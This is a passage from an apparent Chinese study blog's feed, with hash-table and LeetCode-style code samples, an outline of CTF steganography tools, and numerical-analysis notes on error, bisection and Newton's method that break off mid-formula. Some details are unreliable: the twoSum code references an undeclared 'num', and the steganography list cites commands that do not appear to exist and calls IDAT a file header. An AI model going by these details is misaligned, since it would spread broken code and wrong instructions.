hashMap: &quot;</span> &lt;&lt; (hashMap.<span class="hljs-built_in">find</span>(<span class="hljs-string">&quot;c&quot;</span>) != hashMap.<span class="hljs-built_in">end</span>()) &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// 无序集合（unordered_set）</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;\n无序集合操作（unordered_set）：&quot;</span> &lt;&lt; std::endl;<br>    std::unordered_set&lt;<span class="hljs-type">int</span>&gt; hashSet;<br>    hashSet.<span class="hljs-built_in">insert</span>(<span class="hljs-number">1</span>);<br>    hashSet.<span class="hljs-built_in">insert</span>(<span class="hljs-number">2</span>);<br>    hashSet.<span class="hljs-built_in">insert</span>(<span class="hljs-number">3</span>);<br><br>    <span class="hljs-comment">// 添加元素</span><br>    hashSet.<span class="hljs-built_in">insert</span>(<span class="hljs-number">4</span>);<br><br>    <span class="hljs-comment">// 删除元素</span><br>    hashSet.<span class="hljs-built_in">erase</span>(<span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">// 遍历集合</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Set elements:&quot;</span> &lt;&lt; std::endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> elem : hashSet) &#123;<br>        std::cout &lt;&lt; elem &lt;&lt; std::endl;<br>    &#125;<br><br>    <span class="hljs-comment">// 检查元素是否存在</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Element 3 in hashSet: &quot;</span> &lt;&lt; (hashSet.<span class="hljs-built_in">find</span>(<span class="hljs-number">3</span>) != hashSet.<span class="hljs-built_in">end</span>()) &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Java实现</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">// Java实现</span><br>import java.util.HashMap;<br>import java.util.Map;<br>import java.util.HashSet;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">java3</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>)</span> &#123;<br>        <span class="hljs-comment">// 哈希表（HashMap）</span><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Java 实现\n&quot;</span>);<br><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;哈希表操作（HashMap）：&quot;</span>);<br>        HashMap&lt;String, Integer&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">1</span>);<br>        hashMap.put(<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">2</span>);<br>        hashMap.put(<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-number">3</span>);<br><br>        <span class="hljs-comment">// 添加元素</span><br>        hashMap.put(<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-comment">// 访问元素</span><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Value for key &#x27;a&#x27;: &quot;</span> + hashMap.<span class="hljs-keyword">get</span>(<span class="hljs-string">&quot;a&quot;</span>));<br><br>        <span class="hljs-comment">// 修改元素</span><br>        hashMap.put(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">10</span>);<br><br>        <span class="hljs-comment">// 删除元素</span><br>        hashMap.<span class="hljs-keyword">remove</span>(<span class="hljs-string">&quot;b&quot;</span>);<br><br>        <span class="hljs-comment">// 遍历哈希表</span><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Hash table elements:&quot;</span>);<br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Integer&gt; entry : hashMap.entrySet()) &#123;<br>            System.<span class="hljs-keyword">out</span>.println(entry.getKey() + <span class="hljs-string">&quot; &quot;</span> + entry.getValue());<br>        &#125;<br><br>        <span class="hljs-comment">// 检查键是否存在</span><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Key &#x27;c&#x27; in hashMap: &quot;</span> + hashMap.containsKey(<span class="hljs-string">&quot;c&quot;</span>));<br><br>        <span class="hljs-comment">// 无序集合（HashSet）</span><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;\n无序集合操作（HashSet）：&quot;</span>);<br>        HashSet&lt;Integer&gt; hashSet = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br>        hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-number">1</span>);<br>        hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-number">2</span>);<br>        hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-number">3</span>);<br><br>        <span class="hljs-comment">// 添加元素</span><br>        hashSet.<span class="hljs-keyword">add</span>(<span class="hljs-number">4</span>);<br><br>        <span class="hljs-comment">// 删除元素</span><br>        hashSet.<span class="hljs-keyword">remove</span>(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// 遍历集合</span><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Set elements:&quot;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> elem : hashSet) &#123;<br>            System.<span class="hljs-keyword">out</span>.println(elem);<br>        &#125;<br><br>        <span class="hljs-comment">// 检查元素是否存在</span><br>        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;Element 3 in hashSet: &quot;</span> + hashSet.contains(<span class="hljs-number">3</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>py的实现</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># Python实现</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Python 实现&quot;</span>)<br><br><span class="hljs-comment"># 哈希表（字典）</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n哈希表操作（Dictionary）：&quot;</span>)<br>hash_table = &#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>: 1,<br>    <span class="hljs-string">&#x27;b&#x27;</span>: 2,<br>    <span class="hljs-string">&#x27;c&#x27;</span>: 3<br>&#125;<br><br><span class="hljs-comment"># 添加元素</span><br>hash_table[<span class="hljs-string">&#x27;d&#x27;</span>] = 4<br><br><span class="hljs-comment"># 访问元素</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Value for key &#x27;a&#x27;:&quot;</span>, hash_table[<span class="hljs-string">&#x27;a&#x27;</span>])<br><br><span class="hljs-comment"># 修改元素</span><br>hash_table[<span class="hljs-string">&#x27;a&#x27;</span>] = 10<br><br><span class="hljs-comment"># 删除元素</span><br>del hash_table[<span class="hljs-string">&#x27;b&#x27;</span>]<br><br><span class="hljs-comment"># 遍历哈希表</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hash table elements:&quot;</span>)<br><span class="hljs-keyword">for</span> key, value <span class="hljs-keyword">in</span> hash_table.items():<br>    <span class="hljs-built_in">print</span>(key, value)<br><br><span class="hljs-comment"># 检查键是否存在</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Key &#x27;c&#x27; in hash_table:&quot;</span>, <span class="hljs-string">&#x27;c&#x27;</span> <span class="hljs-keyword">in</span> hash_table)<br><br><span class="hljs-comment"># 无序集合（Set）</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n无序集合操作（Set）：&quot;</span>)<br>unordered_set = &#123;1, 2, 3&#125;<br><br><span class="hljs-comment"># 添加元素</span><br>unordered_set.<span class="hljs-built_in">add</span>(4)<br><br><span class="hljs-comment"># 删除元素</span><br>unordered_set.<span class="hljs-built_in">remove</span>(2)<br><br><span class="hljs-comment"># 遍历集合</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Set elements:&quot;</span>)<br><span class="hljs-keyword">for</span> elem <span class="hljs-keyword">in</span> unordered_set:<br>    <span class="hljs-built_in">print</span>(elem)<br><br><span class="hljs-comment"># 检查元素是否存在</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Element 3 in unordered_set:&quot;</span>, 3 <span class="hljs-keyword">in</span> unordered_set)<br></code></pre></td></tr></table></figure><h2 id="经验-2"><a href="#经验-2" class="headerlink" title="经验"></a>经验</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">private</span>:<br>    std::unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; h;  <br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-comment">// 遍历数组 nums</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.<span class="hljs-built_in">size</span>(); i++) &#123;                    <br>            <span class="hljs-keyword">if</span> (h.<span class="hljs-built_in">find</span>(target-num[i]) != h.<span class="hljs-built_in">end</span>()) &#123;<br>                <span class="hljs-keyword">return</span> &#123;h[target-num[i]], i&#125;;  <span class="hljs-comment">// 找到两数之和，返回其索引</span><br>            &#125;<br>            <span class="hljs-comment">// 如果不存在，将当前元素和索引存入哈希表</span><br>            h[nums[i]] = i;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;  <span class="hljs-comment">// 如果未找到符合条件的数对，返回空数组</span><br>    &#125;<br>&#125;;<br><br>模拟行走机器人<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_set&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">robotSim</span><span class="hljs-params">(std::vector&lt;<span class="hljs-type">int</span>&gt;&amp; commands, std::vector&lt;std::vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; obstacles)</span> </span>&#123;<br>        <span class="hljs-type">int</span> dirs[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>&#125;;  <span class="hljs-comment">// 四个方向: 北(0,1), 东(1,0), 南(0,-1), 西(-1,0)</span><br>        <span class="hljs-keyword">auto</span> f = [](<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y) &#123; <span class="hljs-keyword">return</span> x * <span class="hljs-number">60010</span> + y; &#125;;  <span class="hljs-comment">// 将障碍物位置映射为唯一的值</span><br>        std::unordered_set&lt;<span class="hljs-type">int</span>&gt; s;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; e : obstacles) &#123;<br>            s.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">f</span>(e[<span class="hljs-number">0</span>], e[<span class="hljs-number">1</span>]));<br>        &#125;<br><br>        <span class="hljs-type">int</span> x = <span class="hljs-number">0</span>, y = <span class="hljs-number">0</span>, ans = <span class="hljs-number">0</span>, k = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> c : commands) &#123;<br>            <span class="hljs-keyword">if</span> (c == <span class="hljs-number">-2</span>) &#123;<br>                k = (k + <span class="hljs-number">3</span>) % <span class="hljs-number">4</span>;  <span class="hljs-comment">// 向左转 90 度</span><br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c == <span class="hljs-number">-1</span>) &#123;<br>                k = (k + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>;  <span class="hljs-comment">// 向右转 90 度</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">while</span> (c-- &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-type">int</span> nx = x + dirs[k], ny = y + dirs[k + <span class="hljs-number">1</span>];<br>                    <span class="hljs-keyword">if</span> (s.<span class="hljs-built_in">count</span>(<span class="hljs-built_in">f</span>(nx, ny))) &#123;<br>                        <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// 遇到障碍物</span><br>                    &#125;<br>                    x = nx;<br>                    y = ny;<br>                    ans = std::<span class="hljs-built_in">max</span>(ans, x * x + y * y);  <span class="hljs-comment">// 计算离原点的距离的平方</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br><br><br>字母异位词分组<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    std::vector&lt;std::vector&lt;std::string&gt;&gt; <span class="hljs-built_in">groupAnagrams</span>(std::vector&lt;std::string&gt;&amp; strs) &#123;<br>        std::unordered_map&lt;std::string, std::vector&lt;std::string&gt;&gt; h;  <span class="hljs-comment">// 哈希表，键是排序后的字符串</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; str : strs) &#123;<br>            std::string key = str;<br>            std::<span class="hljs-built_in">sort</span>(key.<span class="hljs-built_in">begin</span>(), key.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// 将字符串排序</span><br>            h[key].<span class="hljs-built_in">push_back</span>(str);  <span class="hljs-comment">// 将原始字符串加入哈希表</span><br>        &#125;<br>        <br>        std::vector&lt;std::vector&lt;std::string&gt;&gt; result;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; p : h) &#123;<br>            result.<span class="hljs-built_in">push_back</span>(p.second);  <span class="hljs-comment">// 收集结果</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h1 id="六-前缀和"><a href="#六-前缀和" class="headerlink" title="六.前缀和"></a>六.前缀和</h1><p>比较前缀和，差分，双指针，滑动窗口，单调栈各自适用的情况</p><ol><li><p>前缀和（Prefix Sum）<br>适用情况：<br>快速计算数组某个子区间的和：适用于需要多次计算数组某个区间和的场景。<br>区间查询和更新较少：适合静态数组或查询操作远多于更新操作的情况。</p></li><li><p>差分（Difference Array）<br>适用情况：<br>快速进行区间修改：适用于需要频繁对数组某个区间进行加减操作的场景。<br>需要高效进行批量更新：适合大规模区间更新操作。</p></li><li><p>双指针（Two Pointers）<br>适用情况：<br>处理有序数组：适用于需要在有序数组或链表中查找、遍历等操作。<br>解决滑动窗口问题：适合在数组或字符串上维护动态区间的问题。</p></li><li><p>滑动窗口（Sliding Window）<br>适用情况：<br>子数组问题：适用于需要找到数组中满足特定条件的子数组或子字符串的问题。<br>连续子区间：适合处理需要计算连续子区间的问题。</p></li><li><p>单调栈（Monotonic Stack）<br>适用情况：<br>找到数组中每个元素的下一个更大（或更小）元素：适用于需要在数组中找到特定方向上的极值问题。<br>维护区间单调性：适合处理需要保持区间单调性的问题。</p></li></ol><h1 id="七-双指针"><a href="#七-双指针" class="headerlink" title="七.双指针"></a>七.双指针</h1><h1 id="八-递归"><a href="#八-递归" class="headerlink" title="八.递归"></a>八.递归</h1><h1 id="九-分治"><a href="#九-分治" class="headerlink" title="九.分治"></a>九.分治</h1><h1 id="十-二叉树"><a href="#十-二叉树" class="headerlink" title="十.二叉树"></a>十.二叉树</h1><h1 id="十一-图"><a href="#十一-图" class="headerlink" title="十一.图"></a>十一.图</h1><h1 id="十二-搜索"><a href="#十二-搜索" class="headerlink" title="十二.搜索"></a>十二.搜索</h1><h1 id="十三-二分"><a href="#十三-二分" class="headerlink" title="十三.二分"></a>十三.二分</h1><h1 id="十四-排序"><a href="#十四-排序" class="headerlink" title="十四.排序"></a>十四.排序</h1><h1 id="十五-贪心"><a href="#十五-贪心" class="headerlink" title="十五. 贪心"></a>十五. 贪心</h1><h1 id="十六-动态规划"><a href="#十六-动态规划" class="headerlink" title="十六.动态规划"></a>十六.动态规划</h1><h1 id="十七-字典树-并查集"><a href="#十七-字典树-并查集" class="headerlink" title="十七.字典树,并查集"></a>十七.字典树,并查集</h1><h1 id="十八-图论"><a href="#十八-图论" class="headerlink" title="十八.图论"></a>十八.图论</h1><h1 id="十九-字符串处理"><a href="#十九-字符串处理" class="headerlink" title="十九.字符串处理"></a>十九.字符串处理</h1><h1 id="二十-高级搜索"><a href="#二十-高级搜索" class="headerlink" title="二十.高级搜索"></a>二十.高级搜索</h1><h1 id="二十一-平衡二叉树"><a href="#二十一-平衡二叉树" class="headerlink" title="二十一.平衡二叉树"></a>二十一.平衡二叉树</h1><h1 id="二十二-跳跃表"><a href="#二十二-跳跃表" class="headerlink" title="二十二.跳跃表"></a>二十二.跳跃表</h1><h1 id="二十三-线段树"><a href="#二十三-线段树" class="headerlink" title="二十三.线段树"></a>二十三.线段树</h1>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>隐写</title>
    <link href="/2024/09/08/%E9%9A%90%E5%86%99/"/>
    <url>/2024/09/08/%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h3 id="1-基础文件处理"><a href="#1-基础文件处理" class="headerlink" title="1. 基础文件处理"></a>1. 基础文件处理</h3><ul><li><strong>文件打包与混淆：</strong><ul><li>利用<code>polyglots</code>技巧进行多文件混合（如：图片与其他文件混合）。</li><li><code>base</code>操作，用于进行编码、解码。</li><li>工具：<code>CyberChef</code>、<code>Cryptool</code>、<code>Hiencode</code>等。</li></ul></li><li><strong>隐写工具及隐写信息提取：</strong><ul><li>使用<code>word</code>进行隐写。</li><li>常用命令：<ul><li><code>ls</code>用于列出隐藏内容。</li><li><code>php-sup -win -r</code>相关命令用于分析和处理隐写信息。</li></ul></li><li>其他工具：<code>stegsolve</code>、<code>pngcheck</code>、<code>exiftool</code>、<code>snow</code>（雪隐写工具）。</li></ul></li></ul><hr><h3 id="2-隐写术工具及技术"><a href="#2-隐写术工具及技术" class="headerlink" title="2. 隐写术工具及技术"></a>2. 隐写术工具及技术</h3><ul><li><strong>图片隐写处理：</strong><ul><li>使用<code>pngcheck</code>分析PNG格式图像。</li><li>了解文件格式结构，文件头（IDAT）等。</li><li>隐写信息提取工具：<code>stegsolve</code>、<code>stegdetect</code>。</li></ul></li><li><strong>音频隐写处理：</strong><ul><li>使用<code>audacity</code>工具分析音频文件中的隐写信息。</li><li>支持的文件格式：<code>mp3</code>、<code>wav</code>、<code>mp4</code>等。</li></ul></li><li><strong>视频及其他格式隐写处理：</strong><ul><li>使用<code>imagemagick</code>处理GIF等格式文件。</li><li>命令：<code>sudo imagemagick</code>用于分析图像及GIF。</li></ul></li></ul><hr><h3 id="3-隐写检测及分析工具"><a href="#3-隐写检测及分析工具" class="headerlink" title="3. 隐写检测及分析工具"></a>3. 隐写检测及分析工具</h3><ul><li><strong>常见隐写检测工具：</strong><ul><li><code>pngcheck</code>用于PNG格式的隐写检测。</li><li><code>stegdetect</code>用于JPG隐写的检测。</li></ul></li><li><strong>其他高级隐写分析工具：</strong><ul><li><code>blindwatermark</code>（盲水印分析工具）。</li><li><code>stegano</code>系列工具，如<code>xiasteganography</code>。</li></ul></li></ul><hr><h3 id="4-高级隐写技术及其他相关工具"><a href="#4-高级隐写技术及其他相关工具" class="headerlink" title="4. 高级隐写技术及其他相关工具"></a>4. 高级隐写技术及其他相关工具</h3><ul><li><strong>多种隐写工具对比及测试：</strong><ul><li>对比不同隐写工具的优劣，如：<code>bmfontpy3</code>、<code>blindwatermark</code>等。</li><li><code>cover</code>和<code>coalesce</code>等命令用于分析音频、视频的隐写信息。</li></ul></li><li><strong>常用隐写术的命令及工具：</strong><ul><li><code>mp3info</code>、<code>ffmpeg</code>、<code>snow</code>等工具。</li></ul></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/07/%E6%95%B0%E5%80%BC%E5%88%86%E6%9E%90/"/>
    <url>/2024/09/07/%E6%95%B0%E5%80%BC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>title: 如何搭建一篇博客2024版<br>date: 2024-08-30 19:44:14<br>categories:</p><ul><li>环境搭建<br>tags: 环境</li></ul><h1 id="数值分析笔记"><a href="#数值分析笔记" class="headerlink" title="数值分析笔记"></a>数值分析笔记</h1><h2 id="1-误差分析"><a href="#1-误差分析" class="headerlink" title="1. 误差分析"></a>1. 误差分析</h2><p>在数值计算中，误差是不可避免的，理解误差的来源、传播和影响非常重要。</p><h3 id="1-1-误差的类型"><a href="#1-1-误差的类型" class="headerlink" title="1.1 误差的类型"></a>1.1 误差的类型</h3><ul><li><p><strong>绝对误差</strong>：<br>这是计算结果与实际结果的差异。设真实值为 $x_{\text{true}}$，计算结果为 $x_{\text{approx}}$，那么绝对误差为：</p><p>$$<br>\text{绝对误差} &#x3D; |x_{\text{true}} - x_{\text{approx}}|<br>$$</p><p><strong>举例</strong>：假设真实值 $x_{\text{true}} &#x3D; 3.141592$，近似值 $x_{\text{approx}} &#x3D; 3.14$，那么：</p><p>$$<br>\text{绝对误差} &#x3D; |3.141592 - 3.14| &#x3D; 0.001592<br>$$</p></li><li><p><strong>相对误差</strong>：<br>这是绝对误差相对于真实值的比例，表示为：</p><p>$$<br>\text{相对误差} &#x3D; \frac{\text{绝对误差}}{x_{\text{true}}}<br>$$</p><p><strong>举例</strong>：真实值 $x_{\text{true}} &#x3D; 3.141592$，那么相对误差为：</p><p>$$<br>\text{相对误差} &#x3D; \frac{0.001592}{3.141592} \approx 0.000507<br>$$<br>表示误差大约为真实值的 $0.05%$。</p></li></ul><h3 id="1-2-误差传播"><a href="#1-2-误差传播" class="headerlink" title="1.2 误差传播"></a>1.2 误差传播</h3><p>误差在数值计算中会通过运算逐步放大。例如，如果你在连续使用一个近似值进行多次计算，每一步运算可能都会引入新的误差。</p><p><strong>举例</strong>：<br>假设你用 $x &#x3D; 3.14$ 来代替 $\pi$，并进行平方运算：<br>$$<br>x^2 &#x3D; 3.14^2 &#x3D; 9.8596<br>$$<br>而真实值 $\pi^2 \approx 9.8696$，可以看到随着运算的进行，误差进一步增大了。</p><h2 id="2-非线性方程求根"><a href="#2-非线性方程求根" class="headerlink" title="2. 非线性方程求根"></a>2. 非线性方程求根</h2><p>非线性方程求根指的是找到使得 $f(x) &#x3D; 0$ 的 $x$ 值。常见的求根方法包括二分法、牛顿法和割线法。</p><h3 id="2-1-二分法"><a href="#2-1-二分法" class="headerlink" title="2.1 二分法"></a>2.1 二分法</h3><p>二分法是一种稳定且简单的求根方法，适用于连续函数。其基本思想是利用函数在某个区间 $[a, b]$ 上的符号变化，逐步缩小区间，直到找到近似根。</p><p><strong>算法步骤</strong>：</p><ol><li>取一个初始区间 $[a, b]$，且 $f(a) \cdot f(b) &lt; 0$，保证方程在 $[a, b]$ 之间有根。</li><li>计算中点 $m &#x3D; \frac{a + b}{2}$，检查 $f(m)$ 的符号。<ul><li>如果 $f(m) &#x3D; 0$，则 $m$ 就是方程的根。</li><li>如果 $f(m) \cdot f(a) &lt; 0$，则根在区间 $[a, m]$，令 $b &#x3D; m$。</li><li>如果 $f(m) \cdot f(b) &lt; 0$，则根在区间 $[m, b]$，令 $a &#x3D; m$。</li></ul></li><li>重复步骤2，直到区间长度足够小。</li></ol><p><strong>举例</strong>：求解方程 $f(x) &#x3D; x^2 - 4 &#x3D; 0$ 的根（真实解为 $x &#x3D; 2$ 和 $x &#x3D; -2$）。</p><ul><li>初始区间取 $[1, 3]$，因为 $f(1) &#x3D; -3$，$f(3) &#x3D; 5$，满足 $f(1) \cdot f(3) &lt; 0$。</li><li>计算中点 $m &#x3D; \frac{1 + 3}{2} &#x3D; 2$，此时 $f(2) &#x3D; 0$，找到了根 $x &#x3D; 2$。</li></ul><h3 id="2-2-牛顿法"><a href="#2-2-牛顿法" class="headerlink" title="2.2 牛顿法"></a>2.2 牛顿法</h3><p>牛顿法是一种快速收敛的求根方法，它利用函数在某一点的切线来迭代逼近根。牛顿法的迭代公式为：<br>$$<br>x_{n+1} &#x3D; x_n - \frac{f(x_n)}{f’(x_n)}<br>$$<br>要求函数 $f(x)$ 的导数 $f’(x)$ 存在且容易计算。</p><p><strong>举例</strong>：用牛顿法求解方程 $f(x) &#x3D; x^2 - 4 &#x3D; 0$。</p><ul><li>设初始值 $x_0 &#x3D; 3$。</li><li>计算 $f(3) &#x3D; 5$，$f’(3) &#x3D; 2 \times 3 &#x3D; 6$，则迭代公式为：<br>$$<br>x_1 &#x3D; 3 - \frac{5}{6} \approx 2.17<br>$$</li><li>继续迭代，$f(2.17) \approx 